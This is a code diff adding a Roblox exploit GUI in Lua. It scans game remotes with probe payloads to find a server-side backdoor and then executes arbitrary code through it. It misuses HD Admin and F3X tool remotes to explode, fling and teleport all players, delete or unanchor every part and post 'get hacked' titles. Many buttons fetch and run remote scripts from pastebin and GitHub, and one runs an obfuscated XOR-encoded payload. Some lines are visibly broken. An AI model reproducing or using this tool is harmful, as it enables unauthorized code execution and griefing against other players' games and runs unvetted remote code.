@@ -300,6 +300,1408 @@ local function buttonClickEffect(button,R,G,B,r,g,b)
     task.wait(0.1)
     createTween(button, {BackgroundColor3 = Color3.fromRGB(r, g, b)}, 0.1)
 end
+local gg = LMG2L["ScreenGui_1"]
+gg.Parent = game.CoreGui
+gg.ResetOnSpawn = false
+gg.DisplayOrder = 3
+local admin = LMG2L["admin_d"]
+local scriptHub = LMG2L["sc hub_6"]
+local addSc = LMG2L["schub_4"]
+local addAdmin = LMG2L["schub_5"]
+admin.Visible = false
+scriptHub.Visible = true
+addSc.MouseButton1Click:Connect(function()
+	scriptHub.Visible = true
+	admin.Visible = false
+	buttonClickEffect(addSc, 231, 23, 255, 231, 231, 231)
+end)
+
+addAdmin.MouseButton1Click:Connect(function()
+	admin.Visible = true
+	scriptHub.Visible = false
+	buttonClickEffect(addAdmin, 231, 23, 255, 231, 231, 231)
+end)
+
+local ss = LMG2L["TextButton_a"]
+
+local backdoor = nil
+local alphabet = {'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'}
+local function generateName(length)
+    local text = ''
+    for i = 1, length do
+        text = text .. alphabet[math.random(1,#alphabet)]
+    end
+    return text
+end
+
+local function updateStatus(message, color)
+    ss.Text = "Status: " .. message
+    ss.TextColor3 = color or Color3.fromRGB(231, 231, 231)
+end
+
+
+local function runRemote(remote, data)
+        if not remote then return end
+        if remote:IsA("RemoteEvent") then
+            remote:FireServer(data)
+           elseif remote:IsA("RemoteFunction") then
+             task.spawn(function()
+                  remote:InvokeServer(data)
+                end)
+            end
+end
+
+local foundRemote = nil
+
+local function findRemote()
+    local remotes = {}
+
+    local protected_backdoor = game:GetService('ReplicatedStorage'):FindFirstChild('lh'..game.PlaceId/6666*1337*game.PlaceId)
+    
+    if protected_backdoor and protected_backdoor:IsA('RemoteFunction') then
+        local code = generateName(math.random(12,30))
+        local payload = "l=Instance.new(\"Model\",workspace) l.Name='" .. code .. "'"
+        task.spawn(function()
+            protected_backdoor:InvokeServer('nil', payload) 
+        end)
+        remotes[code] = protected_backdoor
+    end
+
+    for i,remote in game:GetDescendants() do
+        if not remote:IsA('RemoteEvent') and not remote:IsA('RemoteFunction') then continue end
+        if string.split(remote:GetFullName(), '.')[1]=='RobloxReplicatedStorage' then continue end
+        if remote.Parent==game:GetService("ReplicatedStorage") or remote.Parent.Parent==game:GetService("ReplicatedStorage") or remote.Parent.Parent.Parent==game:GetService("ReplicatedStorage") then
+            if remote:FindFirstChild('__FUNCTION') or remote.Name=='__FUNCTION' then continue end
+            if remote.Parent.Parent.Name=='HDAdminClient' and remote.Parent.Name=='Signals' then continue end
+            if remote.Parent.Name=='DefaultChatSystemChatEvents' then continue end
+        end
+        
+        local code = generateName(math.random(12,30))
+        local payload = "l=Instance.new(\"Model\",workspace) l.Name='" .. code .. "'"
+        runRemote(remote, payload)
+        remotes[code] = remote
+    end
+
+    for i = 1, 100 do
+        updateStatus("Scanning... "..i.."%")
+        for code,remote in remotes do
+            if workspace:FindFirstChild(code) then
+              backdoor = remote
+              --  runRemote(backdoor, detected)
+                updateStatus("Backdoor")
+                return true
+            end
+        end
+        task.wait(0.05)
+    end
+
+    updateStatus("no Backdoor")
+    ss.Text = "no backdoor :("
+end
+
+local code= LMG2L["TextBox_7"]
+local exec= LMG2L["TextButton_9"]
+local clear=LMG2L["TextButton_8"]
+
+exec.MouseButton1Click:Connect(function()
+local scriptText = code.Text
+    if backdoor then
+        runRemote(backdoor, scriptText)
+        Execy.Text = "Executed!"
+        
+        task.wait(0.5)
+        Execy.Text = "Execute"
+    else
+        Execy.Text = "execute on client!"
+        loadsting(scriptText)()
+        task.wait(0.5)
+        Execy.Text = "Execute"
+    end
+end)
+
+clear.MouseButton1Click:Connect(function()  
+code.Text = ''
+end)
+
+ss.MouseButton1Click:Connect(function()
+
+ss.Text = "Scanning..."
+
+        if not findRemote() then
+            ss.Text = "Load"
+        end
+
+end)
+
+-- SERVICES
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local player = Players.LocalPlayer
+
+local RequestCommand
+local hd = ReplicatedStorage:FindFirstChild("HDAdminHDClient")
+
+if hd and hd:FindFirstChild("Signals") then
+    RequestCommand = hd.Signals:FindFirstChild("RequestCommandSilent")
+end
+
+-- F3X VAR
+local remote
+
+--------------------------------------------------
+-- F3X SETUP
+--------------------------------------------------
+function Maket()
+    local tool
+
+    for _,v in ipairs(player:GetDescendants()) do
+        if v.Name == "SyncAPI" then
+            tool = v.Parent
+            break
+        end
+    end
+
+    if not tool then
+        for _,v in ipairs(ReplicatedStorage:GetDescendants()) do
+            if v.Name == "SyncAPI" then
+                tool = v.Parent
+                break
+            end
+        end
+    end
+
+    if not tool then
+        warn("🔴 F3X NOT FOUND")
+        RequestCommand:InvokeServer("/btools me")
+        return false
+    end
+
+    remote = tool.SyncAPI.ServerEndpoint
+
+    function _(args)
+        remote:InvokeServer(unpack(args))
+    end
+
+    return true
+end
+
+function CreatePart(cf, parent)
+    _( {
+        [1] = "CreatePart",
+        [2] = "Normal",
+        [3] = cf,
+        [4] = parent
+    })
+
+    task.wait()
+
+    for _,v in ipairs(parent:GetChildren()) do
+        if v:IsA("BasePart") and
+           (v.Position - cf.Position).Magnitude < 2 then
+            return v
+        end
+    end
+end
+local TweenService = game:GetService("TweenService")
+
+local TweenService = game:GetService("TweenService")
+
+function TweenLoopRotate(p, minDur, maxDur, minDeg, maxDeg)
+	if not p then return end
+
+	minDur = minDur or 0.2
+	maxDur = maxDur or 0.8
+	minDeg = minDeg or 20
+	maxDeg = maxDeg or 120
+
+	p.Anchored = true
+
+	task.spawn(function()
+		while p and p.Parent do
+			-- random dur & deg
+			local dur = math.random() * (maxDur - minDur) + minDur
+			local deg = math.random(minDeg, maxDeg)
+
+			-- random arah
+			local rx = math.rad(math.random(-deg, deg))
+			local ry = math.rad(math.random(-deg, deg))
+			local rz = math.rad(math.random(-deg, deg))
+
+			local targetCF = p.CFrame * CFrame.Angles(rx, ry, rz)
+
+			local tween = TweenService:Create(
+				p,
+				TweenInfo.new(
+					dur,
+					Enum.EasingStyle.Sine,
+					Enum.EasingDirection.InOut
+				),
+				{CFrame = targetCF}
+			)
+
+			tween:Play()
+			tween.Completed:Wait()
+
+			-- sync
+			_({
+				"SyncRotate",
+				{{
+					Part = p,
+					CFrame = p.CFrame
+				}}
+			})
+		end
+	end)
+end
+
+function Resize(p,s,cf) _( {"SyncResize", {{Part=p,Size=s,CFrame=cf}}} ) end
+function Color(p,c) _( {"SyncColor", {{Part=p,Color=c,UnionColoring=false}}} ) end
+function SetName(p,n) _( {"SetName",{p},n} ) end
+function SetLocked(p,b) _( {"SetLocked",{p},b} ) end
+function SetCollision(p,b) _( {"SyncCollision",{{Part=p,CanCollide=b}}} ) end
+function SetTrans(p,t) _( {"SyncMaterial",{{Part=p,Transparency=t}}} ) end
+
+function SpawnDecal(p,face)
+    _( {"CreateTextures",{{Part=p,Face=face,TextureType="Decal"}}} )
+end
+
+function AddDecal(p,id,face)
+    _( {"SyncTexture",{{Part=p,Face=face,TextureType="Decal",Texture="rbxassetid://"..id}}} )
+end
+
+function AddMesh(p) _( {"CreateMeshes",{{Part=p}}} ) end
+function SetMesh(p,id) _( {"SyncMesh",{{Part=p,MeshId="rbxassetid://"..id}}} ) end
+function SetTexture(p,id) _( {"SyncMesh",{{Part=p,TextureId="rbxassetid://"..id}}} ) end
+function MeshResize(p,s) _( {"SyncMesh",{{Part=p,Scale=s}}} ) end
+function Sky(id,enable)
+local skyspinning = enable
+	enable = enable or false
+
+  if skyspinning == true then
+    local hrp = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
+    if not hrp then return end
+
+    local cf = hrp.CFrame + Vector3.new(0,6,0)
+    CreatePart(cf, workspace)
+
+    task.wait()
+
+    for _,v in ipairs(workspace:GetChildren()) do
+        if v:IsA("BasePart") and
+           (v.Position - cf.Position).Magnitude < 2 then
+            SetName(v,"Skybox")
+            TweenLoopRotate(v, 0.2, 2, 14, 200)
+            AddMesh(v)
+            SetMesh(v,"111891702759441")
+            SetTexture(v,id)
+            MeshResize(v,Vector3.new(7200,7200,7200))
+            SetLocked(v,true)
+            break
+        end
+    end
+   elseif skyspinning == false then
+    local hrp = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
+    if not hrp then return end
+
+    local cf = hrp.CFrame + Vector3.new(0,6,0)
+    CreatePart(cf, workspace)
+
+    task.wait()
+
+    for _,v in ipairs(workspace:GetChildren()) do
+        if v:IsA("BasePart") and
+           (v.Position - cf.Position).Magnitude < 2 then
+            SetName(v,"Skybox")
+            AddMesh(v)
+            SetMesh(v,"111891702759441")
+            SetTexture(v,id)
+            MeshResize(v,Vector3.new(7200,7200,7200))
+            SetLocked(v,true)
+            break
+        end
+    end
+   end
+end
+function AddFire(part)
+    _( {
+        [1] = "CreateDecorations",
+        [2] = {
+            {
+                Part = part,
+                DecorationType = "Fire"
+            }
+        }
+    })
+end
+function spam(id)
+
+			for i,v in game.workspace:GetDescendants() do
+
+				if v:IsA("BasePart") then
+
+					spawn(function()
+
+						SetLocked(v,false)
+
+						SpawnDecal(v,Enum.NormalId.Front)
+
+						AddDecal(v,id,Enum.NormalId.Front)
+
+	
+
+						SpawnDecal(v,Enum.NormalId.Back)
+
+						AddDecal(v,id,Enum.NormalId.Back)
+
+	
+
+						SpawnDecal(v,Enum.NormalId.Right)
+
+						AddDecal(v,id,Enum.NormalId.Right)
+
+	
+
+						SpawnDecal(v,Enum.NormalId.Left)
+
+						AddDecal(v,id,Enum.NormalId.Left)
+
+	
+
+						SpawnDecal(v,Enum.NormalId.Bottom)
+
+						AddDecal(v,id,Enum.NormalId.Bottom)
+
+	
+
+						SpawnDecal(v,Enum.NormalId.Top)
+
+						AddDecal(v,id,Enum.NormalId.Top)
+
+					end)
+
+				end
+
+			end 
+
+		end
+
+
+local function delete(part)
+    _( {
+        "Remove",
+        { part }
+    })
+end
+
+local function deleteall()
+    for _,v in ipairs(workspace:GetDescendants()) do
+        if v:IsA("BasePart") or v:IsA("UnionOperation") then
+            spawn(function()
+                delete(v)
+            end)
+        end
+    end
+end
+
+scroll= LMG2L["ScrollingFrame_b"]
+CloneDup= LMG2L["TextButton_c"]
+res= LMG2L["TextButton_f"]
+res.MouseButton1Click:Connect(function()  
+RequestCommand:InvokeServer("/res me")
+end)
+r15= LMG2L["TextButton_11"]
+r6= LMG2L["TextButton_10"]
+r15.MouseButton1Click:Connect(function()  
+RequestCommand:InvokeServer("/r15 me")
+end)
+r6.MouseButton1Click:Connect(function()  
+RequestCommand:InvokeServer("/r6 me")
+end)
+music= LMG2L["TextBox_13"]
+volume= LMG2L["TextBox_14"]
+pitch= LMG2L["TextBox_15"]
+music.ClearTextOnFocus = false
+volume.ClearTextOnFocus = false
+pitch.ClearTextOnFocus = false
+m = music.Text
+vol = volume.Text
+pi = pitch.Text
+music.FocusLost:Connect(function()
+	RequestCommand:InvokeServer("/music "..pi.."")
+end)
+volume.FocusLost:Connect(function()
+	RequestCommand:InvokeServer("/volume "..vol.."")
+end)
+pitch.FocusLost:Connect(function()
+	RequestCommand:InvokeServer("/pitch "..pi.."")
+end)
+exp= v["TextButton_16"]
+fling= v["TextButton_18"]
+exp.MouseButton1Click:Connect(function()  
+RequestCommand:InvokeServer("/explode all")
+end)
+fling.MouseButton1Click:Connect(function()  
+RequestCommand:InvokeServer("/fling all")
+end)
+local UIListLayout = Instance.new("UIListLayout")
+UIListLayout.Parent = scroll
+UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
+UIListLayout.Padding = UDim.new(0, 5)
+
+local function Button(text, callback)
+	local btn = Instance.new("TextButton")
+	btn.Parent = scroll
+	btn.TextWrapped = true
+	btn.RichText = true
+	btn.BorderSizePixel = 0
+	btn.TextScaled = true
+	btn.BackgroundColor3 = Color3.fromRGB(255,255,255)
+	btn.Size = UDim2.new(0,288,0,18)
+	btn.Text = text
+
+	btn.MouseButton1Click:Connect(function()
+		pcall(callback)
+	end)
+
+	return btn
+end
+
+Button("Btools f3x", function()
+	RequestCommand:InvokeServer("/btools me")
+wait(0.7)
+RequestCommand:InvokeServer("/btools gavinRGB2")
+end)
+
+Button("Reset f3x", function()
+	RequestCommand:InvokeServer("/res me")
+end)
+
+Button("day f3x", function()
+	RequestCommand:InvokeServer("/time 12")
+end)
+
+Button("audio 1", function()
+	RequestCommand:InvokeServer("/music 91075435074569 /pitch 0.18/volume 10")
+end)
+Button("ForcePlaceAll Realm f3x", function()
+	RequestCommand:InvokeServer("/Forceplace all 11897734287")
+end)
+Button("ForcePlaceAll 0zca realm f3x", function()
+	RequestCommand:InvokeServer("/Forceplace all 106385826040505")
+end)
+Button("Anime Skybox f3x", function()
+	Maket()
+    local hrp = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
+    if not hrp then return end
+
+    local cf = hrp.CFrame + Vector3.new(0,6,0)
+    CreatePart(cf, workspace)
+
+    task.wait()
+    RequestCommand:InvokeServer("/music 134884767490882")
+    RequestCommand:InvokeServer("/volume 25 /pitch 1")
+    for _,v in ipairs(workspace:GetChildren()) do
+        if v:IsA("BasePart") and
+           (v.Position - cf.Position).Magnitude < 2 then
+            SetName(v,"Skybox")
+            AddMesh(v)
+            SetMesh(v,"111891702759441")
+
+            spawn(function()
+            while true do
+               SetTexture(v,21076888)
+            	wait(0.1)
+               SetTexture(v,21076945)
+            	wait(0.1)
+               SetTexture(v,21077007)
+            	wait(0.1)
+               SetTexture(v,21077125)
+            	wait(0.1)
+               SetTexture(v,21077227)
+            	wait(0.1)
+               SetTexture(v,21077345)
+               wait(0.1)
+             end
+             end)
+
+            MeshResize(v,Vector3.new(7200,7200,7200))
+            SetLocked(v,true)
+            break
+        end
+    end
+end)
+Button("Thomas The Dank Engine f3x", function()
+	loadstring(game:HttpGet("https://pastebin.com/raw/WneFn7Wv"))()
+end)
+Button("Gear Gun f3x", function()
+		RequestCommand:InvokeServer("/Gear me 116693764")
+       wait(1.5)
+     RequestCommand:InvokeServer("/Gear me 94233344")
+end)
+
+Button("explode all", function()
+	RequestCommand:InvokeServer("/explode all")
+end)
+Button("Polaria v14 f3x", function()
+  -- polaria v14 f3x
+	loadstring(game:HttpGet("https://pastebin.com/raw/J5bVF0CR"))()
+end)
+Button("cmdbar2", function()
+	RequestCommand:InvokeServer("/cmdbar2 me")
+end)
+Button("troll Skybox Ngemah Cihuyy", function()
+local player = game.Players.LocalPlayer
+local char = player.Character or player.CharacterAdded:Wait()
+local tool
+
+for i, v in player:GetDescendants() do
+    if v.Name == "SyncAPI" then
+        tool = v.Parent
+    end
+end
+
+for i, v in game.ReplicatedStorage:GetDescendants() do
+    if v.Name == "SyncAPI" then
+        tool = v.Parent
+    end
+end
+
+local remote = tool.SyncAPI.ServerEndpoint
+local RunService = game:GetService("RunService")
+
+function _(args)
+    remote:InvokeServer(unpack(args))
+end
+
+function CreatePart(cf, parent)
+    local args = {
+        [1] = "CreatePart",
+        [2] = "Normal",
+        [3] = cf,
+        [4] = parent
+    }
+    _(args)
+end
+
+function SetAnchor(part, boolean)
+    local args = {
+        [1] = "SyncAnchor",
+        [2] = {
+            [1] = {
+                ["Part"] = part,
+                ["Anchored"] = boolean
+            }
+        }
+    }
+    _(args)
+end
+
+function AddMesh(part)
+    local args = {
+        [1] = "CreateMeshes",
+        [2] = {
+            [1] = {
+                ["Part"] = part
+            }
+        }
+    }
+    _(args)
+end
+
+function SetMesh(part, meshid)
+    local args = {
+        [1] = "SyncMesh",
+        [2] = {
+            [1] = {
+                ["Part"] = part,
+                ["MeshId"] = "rbxassetid://" .. meshid
+            }
+        }
+    }
+    _(args)
+end
+
+function SetTexture(part, texid)
+    local args = {
+        [1] = "SyncMesh",
+        [2] = {
+            [1] = {
+                ["Part"] = part,
+                ["TextureId"] = texid
+            }
+        }
+    }
+    _(args)
+end
+
+function MeshResize(part, size)
+    local args = {
+        [1] = "SyncMesh",
+        [2] = {
+            [1] = {
+                ["Part"] = part,
+                ["Scale"] = size
+            }
+        }
+    }
+    _(args)
+end
+
+function SetTransparency(part, value)
+    local args = {
+        [1] = "SyncTransparency",
+        [2] = {
+            [1] = {
+                ["Part"] = part,
+                ["Transparency"] = value
+            }
+        }
+    }
+    _(args)
+end
+
+function DestroyPart(part)
+    local args = {
+        [1] = "Remove",
+        [2] = {
+            [1] = part
+        }
+    }
+    _(args)
+end
+
+local images = {
+    "https://www.roblox.com/asset/?id=82729072434912",
+    "http://www.roblox.com/asset/?id=118421595259480",
+    "http://www.roblox.com/asset/?id=89526486746730",
+    "http://www.roblox.com/asset/?id=107253245905402",
+    "http://www.roblox.com/asset/?id=118891159627998",
+    "http://www.roblox.com/asset/?id=134934179224053",
+    "http://www.roblox.com/asset/?id=139108683368127",
+    "http://www.roblox.com/asset/?id=105671374859664",
+    "http://www.roblox.com/asset/?id=86818270916645",
+    "http://www.roblox.com/asset/?id=128343651021676",
+}
+
+local skyPart
+local skyLoop
+local frameTime = 1 / 10
+local lastUpdate = 0
+
+function CreateSky()
+    local hrp = char:FindFirstChild("HumanoidRootPart")
+    if not hrp then return end
+
+    local cf = hrp.CFrame
+    CreatePart(CFrame.new(cf.Position + Vector3.new(0, 6, 0)), workspace)
+
+    local found = false
+    for i = 1, 50 do
+        task.wait()
+        for _, v in workspace:GetDescendants() do
+            if v:IsA("BasePart") and (v.Position - (cf.Position + Vector3.new(0, 6, 0))).Magnitude < 1 then
+                skyPart = v
+                found = true
+                break
+            end
+        end
+        if found then break end
+    end
+
+    if not skyPart then return end
+
+    SetAnchor(skyPart, true)
+    AddMesh(skyPart)
+    SetMesh(skyPart, "111891702759441")
+    MeshResize(skyPart, Vector3.new(3000, 3000, 3000))
+    SetTransparency(skyPart, 0)
+
+    local index = 1
+    skyLoop = RunService.Heartbeat:Connect(function(deltaTime)
+        lastUpdate = lastUpdate + deltaTime
+        if lastUpdate >= frameTime then
+            lastUpdate = 0
+            if not skyPart then
+                skyLoop:Disconnect()
+                return
+            end
+            SetTexture(skyPart, images[index])
+            index = (index % #images) + 1
+        end
+    end)
+end
+
+function ResetSky()
+    if skyLoop then
+        skyLoop:Disconnect()
+        skyLoop = nil
+    end
+    if skyPart then
+        DestroyPart(skyPart)
+        skyPart = nil
+    end
+    task.spawn(CreateSky)
+end
+
+player.CharacterAdded:Connect(function(newChar)
+    char = newChar
+    ResetSky()
+end)
+
+if char and char:FindFirstChild("Humanoid") then
+    char:WaitForChild("Humanoid").Died:Connect(function()
+        ResetSky()
+    end)
+end
+
+CreateSky()
+end)
+
+Button("Family Cafe f3x", function()
+--[[
+	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
+]]
+loadstring(game:HttpGet("https://gist.githubusercontent.com/1wxaa/93d7c74cd6c1ac0660cc7aec241d5112/raw/87e7559c659907c620a3d3d685eedf8e7b2d81ef/gistfile1.txt"))()
+-- by x9d x wxa \ family cafe
+end)
+
+Button("disco", function()
+RequestCommand:InvokeServer("/disco")
+end)
+
+Button("fog", function()
+RequestCommand:InvokeServer("/fog")
+end)
+
+Button("loadmap", function()
+RequestCommand:InvokeServer("/loadmap")
+end)
+
+Button("Title all [Get Hacked by zoopgui0", function()
+RequestCommand:InvokeServer("/Titler all get hacked by zoopgui0")
+end)
+
+Button("Size all small", function()
+RequestCommand:InvokeServer("/size all 0.3")
+end)
+
+Button("john doe", function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/gavinrgb2/gavindR/refs/heads/main/John%20doe"))()
+
+end)
+
+Button("Unlocked gear", function()
+RequestCommand:InvokeServer("/gear me 24346755")
+   wait(1.5)
+  RequestCommand:InvokeServer("/gear me 121946387")
+   wait(1.5)
+  RequestCommand:InvokeServer("/gear me 108158379")
+   wait(1.5)
+  RequestCommand:InvokeServer("/gear me 125013769")
+end)
+
+Button("skybox gavindr", function()
+Sky("114242500131114",true)
+end)
+
+Button("unchored all", function()
+     for i,v in game.Workspace:GetDescendants() do
+			task.spawn(function()
+         SetAnchor(v, false)
+         end)
+      end
+end)
+
+Button("HUH split Part", function()
+		for i,v in game.Workspace:GetDescendants() do
+			task.spawn(function()
+				TweenLoopRotate(v, 0.1, 5, 12, 188)
+			end)
+		end
+end)
+
+Button("night", function()
+RequestCommand:InvokeServer("/time 0")
+
+end)
+
+Button("tubers cave f3x", function()
+loadstring(game:HttpGet("https://scriptblox.com/script/Universal-Script-Tubers-Cave-F3X-MAP-204748"))()
+end)
+
+Button("f3x head snake", function()
+--[[
+	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
+]]
+local RunService = game:GetService("RunService")
+local Player = game.Players.LocalPlayer
+local char = Player.Character or Player.CharacterAdded:Wait()
+local head = char:WaitForChild("Head")
+local headMesh = head:FindFirstChildWhichIsA("SpecialMesh")
+
+local tool = Player:FindFirstChild("SyncAPI", true) or game.ReplicatedStorage:FindFirstChild("SyncAPI", true)
+if not tool then return end
+local server = tool.Parent.SyncAPI.ServerEndpoint
+
+local myHats = {}
+for _, thing in ipairs(char:GetChildren()) do
+    if thing:IsA("Accessory") and thing:FindFirstChild("Handle") then
+        local mesh = thing.Handle:FindFirstChildWhichIsA("SpecialMesh")
+        if mesh then
+            table.insert(myHats, {
+                part = thing.Handle,
+                mesh = mesh.MeshId
+            })
+        end
+    end
+end
+
+local time = 1
+local off = 1
+local target = 0
+local smooth = 14
+local acc = 0
+local rate = 1/60
+
+_G.ShakeSistemi = true
+
+RunService.RenderStepped:Connect(function(dt)
+    if not _G.ShakeSistemi then return end
+    
+    time = time + dt * 10 
+    target = math.sin(time) * 0.7
+    off = off + (target - off) * dt * smooth
+    
+    acc = acc + dt
+    if acc >= rate then
+        acc = 0
+        
+        local stuff = {
+            {
+                Part = head,
+                MeshId = headMesh.MeshId,
+                Offset = Vector3.new(off, 0, 0)
+            }
+        }
+        
+        for _, hat in ipairs(myHats) do
+            table.insert(stuff, {
+                Part = hat.part,
+                MeshId = hat.mesh,
+                Offset = Vector3.new(off, 0, 0)
+            })
+        end
+        
+        server:InvokeServer("SyncMesh", stuff)
+    end
+end)
+end)
+
+Button("UnethicalNetworks f3x gui v9", function()
+--[[
+	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
+]]
+local bit=bit32 local c="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"local d={}for i=1,#c do d[c:sub(i,i)]=i-1 end local k={43,42,3,201,67,211,224,131,126,225,42,153,9,113,37,150,33,194,245,43,34,246,213,136,56,96,38,7,98,51,204,14,248,203,235,53,122,26,132,141,82,170,186,39,219,61,39,177,123,137,21,131,7,166,186,53,159,80,29,92,120,109,28,84,176,7,49,2,92,20,135,165,242,242,227,2,115,158,113,33,103,103,216,186,82,70,79,151,83,249,218,177,219,94,195,135,124,107,27,115,48,242,164,168,156,27,103,142,79,253,255,71,227,29,100,56,32,148,233,208,156,44,227,22,122,185,205,42,93,52,173,23,28,153} local f={1,1,0,1,1,1,1,1,1,0,1,1,1,0,1,0,1,1,1,1,1,1,1,1,0,1,0,1,0,1,1,1,0,1,1,0,1,1,1,1,1,1,0,1,1,1,1,1,1,1,1,1,1,1,1,1,0,1,0,1,0,1,1,0,1,0,1,1,1,1,0,1,0,1,1,0,1,0,1,1,1,1,1,0,1,0,1,0,1,1,1,1,1,1,1,1,1,1,0,1,1,1,0,1,1,1,0,1,1,1,1,1,1,1,1,1,0,1,1,0,1,0,1,1,1,1,1,1,1,1,1,1,0,1} local b64="R0UwqCeglPEXJ0T+IetCL0CvkBFqgqH4rycjYsVH5CwJo58cDmr3t32Fh0CySU/EGad27GqJ1loyPIkveB5t8NELHmU0c8bNZZWLaRQ8EkIEH/f7IMMqJD+cu8K+LezjExwUHVydU8n4NHP9JJSdLo95S09m94cP8QLNJ1TVuEt/HYQ/bLAA" local raw="" for i=1,#b64-3,4 do local n=bit.bor(bit.lshift(d[b64:sub(i,i)],18),bit.lshift(d[b64:sub(i+1,i+1)],12),bit.lshift(d[b64:sub(i+2,i+2)],6),d[b64:sub(i+3,i+3)]or 0)raw=raw..string.char(bit.rshift(n,16),bit.rshift(n,8)%256,n%256)end local out,j={},1 for i=1,#f do if f[i]==1 then table.insert(out,string.char(bit.bxor(raw:byte(j),k[i])))j=j+1 else j=j+1 end end loadstring(table.concat(out))()
+end)
+
+Button("c00lgui f3x", function()
+--[[
+	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
+]]
+loadstring(game:HttpGet("https://pastebin.com/raw/12AJHyYM"))()
+end)
+
+Button("toadroats f3x", function()
+--[[
+	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
+]]
+local player = game.Players.LocalPlayer
+local char = player.Character or player.CharacterAdded:Wait()
+local tool
+
+-- Find F3X tool
+for _, v in player:GetDescendants() do
+    if v.Name == "SyncAPI" then
+        tool = v.Parent
+    end
+end
+for _, v in game.ReplicatedStorage:GetDescendants() do
+    if v.Name == "SyncAPI" then
+        tool = v.Parent
+    end
+end
+
+local remote = tool.SyncAPI.ServerEndpoint
+local function _(args) remote:InvokeServer(unpack(args)) end
+
+-- F3X helpers
+local function CreatePart(cf, parent)
+    local args = { [1] = "CreatePart", [2] = "Normal", [3] = cf, [4] = parent }
+    _(args)
+end
+local function AddMesh(part)
+    local args = { [1] = "CreateMeshes", [2] = { [1] = { ["Part"] = part } } }
+    _(args)
+end
+local function SetMesh(part, meshid)
+    local args = { [1] = "SyncMesh", [2] = { [1] = { ["Part"] = part, ["MeshId"] = "rbxassetid://"..meshid } } }
+    _(args)
+end
+local function SetTexture(part, texid)
+    local args = { [1] = "SyncMesh", [2] = { [1] = { ["Part"] = part, ["TextureId"] = "rbxassetid://"..texid } } }
+    _(args)
+end
+local function MeshResize(part, size)
+    local args = { [1] = "SyncMesh", [2] = { [1] = { ["Part"] = part, ["Scale"] = size } } }
+    _(args)
+end
+local function SetAnchor(boolean, part)
+    local args = { [1] = "SyncAnchor", [2] = { [1] = { ["Part"] = part, ["Anchored"] = boolean } } }
+    _(args)
+end
+local function SetCollision(part, boolean)
+    local args = { [1] = "SyncCollision", [2] = { [1] = { ["Part"] = part, ["CanCollide"] = boolean } } }
+    _(args)
+end
+local function SetName(part, name)
+    local args = { [1] = "SetName", [2] = { [1] = part }, [3] = name }
+    _(args)
+end
+
+-- Rain Spider loop
+local function createRainSpiders()
+    while true do
+        task.wait(0.3)
+        if player.Character and player.Character:FindFirstChild("Humanoid") and player.Character.Humanoid.Health > 0 then
+            local hrpcf = player.Character.HumanoidRootPart.CFrame
+            local x, z = hrpcf.X, hrpcf.Z
+            local xloc = math.random(-600,600) + x
+            local zloc = math.random(-600,600) + z
+            local yloc = hrpcf.Y + math.random(2000,2048)
+
+            spawn(function()
+                CreatePart(CFrame.new(math.floor(xloc), yloc, math.floor(zloc)), workspace)
+                for _, v in workspace:GetDescendants() do
+                    if v:IsA("BasePart") and v.Position.X == math.floor(xloc) and v.Position.Z == math.floor(zloc) then
+                        SetName(v, "GET TOADROASTED YOU IDIOT HAHAHAHA")
+                        v.Orientation = Vector3.new(math.random(0,360), math.random(0,360), math.random(0,360))
+                        SetAnchor(false, v)
+                        AddMesh(v)
+                        SetMesh(v, "1009824073") -- Toad mesh
+                        SetTexture(v, "1009824086")      --texture :)
+                        MeshResize(v, Vector3.new(5,5,5))
+                        SetCollision(v, false)
+                    end
+                end
+            end)
+        else
+            task.wait(1)
+        end
+    end
+end
+
+coroutine.wrap(createRainSpiders)()
+-- Skybox ToadRoast (single part version)
+local player = game.Players.LocalPlayer
+local char = player.Character or player.CharacterAdded:Wait()
+local tool
+
+-- Find F3X tool
+for _, v in player:GetDescendants() do
+    if v.Name == "SyncAPI" then tool = v.Parent end
+end
+for _, v in game.ReplicatedStorage:GetDescendants() do
+    if v.Name == "SyncAPI" then tool = v.Parent end
+end
+
+local remote = tool.SyncAPI.ServerEndpoint
+local function _(args) remote:InvokeServer(unpack(args)) end
+
+-- F3X helpers
+local function CreatePart(cf, parent) _( { "CreatePart", "Normal", cf, parent } ) end
+local function AddMesh(part) _( { "CreateMeshes", { { Part = part } } } ) end
+local function SetMesh(part, meshid) _( { "SyncMesh", { { Part = part, MeshId = "rbxassetid://"..meshid } } } ) end
+local function SetTexture(part, texid) _( { "SyncMesh", { { Part = part, TextureId = "rbxassetid://"..texid } } } ) end
+local function MeshResize(part, size) _( { "SyncMesh", { { Part = part, Scale = size } } } ) end
+local function SetAnchor(boolean, part) _( { "SyncAnchor", { { Part = part, Anchored = boolean } } } ) end
+local function SetName(part, name) _( { "SetName", { part }, name } ) end
+
+-- Create one giant part with toad texture
+local function SkyboxToadRoast()
+    local hrp = char:WaitForChild("HumanoidRootPart")
+    local cf = hrp.CFrame
+
+    -- Create part above player
+    CreatePart(CFrame.new(cf.Position + Vector3.new(0, 10, 0)), workspace)
+
+    for _, v in workspace:GetDescendants() do
+        if v:IsA("BasePart") and math.floor(v.Position.Y) == math.floor(cf.Position.Y + 10) then
+            SetName(v, "SkyboxToadRoast")
+            SetAnchor(true, v)
+            AddMesh(v)
+
+            -- Apply cube mesh + toad texture
+            SetMesh(v, "111891702759441")       -- cube mesh
+            SetTexture(v, "201208408")         -- toad roast texture
+
+            -- Resize huge to act like sky
+            MeshResize(v, Vector3.new(8000,8000,8000))
+        end
+    end
+end
+
+-- Run once
+SkyboxToadRoast()
+
+end)
+
+Button("save map", function()
+RequestCommand:InvokeServer("/savemap")
+end)
+
+Button("Bring all", function()
+RequestCommand:InvokeServer("/bring all")
+end)
+Button("alert all", function()
